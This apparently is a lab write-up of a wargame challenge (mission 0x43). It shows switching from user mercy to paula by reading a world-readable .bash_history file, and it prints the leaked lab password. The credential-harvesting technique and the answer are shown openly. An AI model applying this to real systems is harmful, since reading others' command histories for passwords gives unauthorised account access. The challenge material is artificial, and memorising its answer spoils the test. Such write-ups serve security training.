# 0x43
This write-up explains the steps taken to complete mission 0x43, starting from user `mercy` and escalating to `paula`.

## Mission
As always, read the objective:
```bash
mercy@venus:~$ cat mission.txt 
################
# MISSION 0x43 #
################

## EN ##
User mercy is always wrong with the password of paula. 
```

## Method of solving
We checked the home directory and noticed that the `.bash_history` file was readable and had a non-zero size. In Linux, this file record the commands previously entered by a user in the terminal.
```bash
mercy@venus:~$ ls -la
total 36
drwxr-x--- 2 root  mercy 4096 Apr  5  2024 .
drwxr-xr-x 1 root  root  4096 Apr  5  2024 ..
-rw-r----- 1 root  mercy  133 Apr  5  2024 .bash_history
-rw-r--r-- 1 mercy mercy  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 mercy mercy 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 mercy mercy  807 Apr 23  2023 .profile
-rw-r----- 1 root  mercy   31 Apr  5  2024 flagz.txt
-rw-r----- 1 root  mercy  190 Apr  5  2024 mission.txt
```
When users accidentally types their password into the terminal instead of a password prompt. It often gets saved into their command history. We inspected the `.bash_history` file to find any leaked credentials.
```bash
mercy@venus:~$ cat .bash_history
ls -A
ls
rm /
ps
sudo -l
watch tv
vi /etc/logs
su paula
dlHZ6cvX6cLuL8p     <------ This is retrieved password
history
history -c
logout
ssh paula@localhost
cat .
ls
ls -l
```
Using the retrieve password, we switch to user `paula` and get the flag.
```bash
mercy@venus:~$ su - paula
Password: 
paula@venus:~$ id ; whoami
uid=1044(paula) gid=1044(paula) groups=1044(paula),1053(hidden)
paula
```

## Key command
`history`
or
`cat .bash_history`

***You are welcome!***

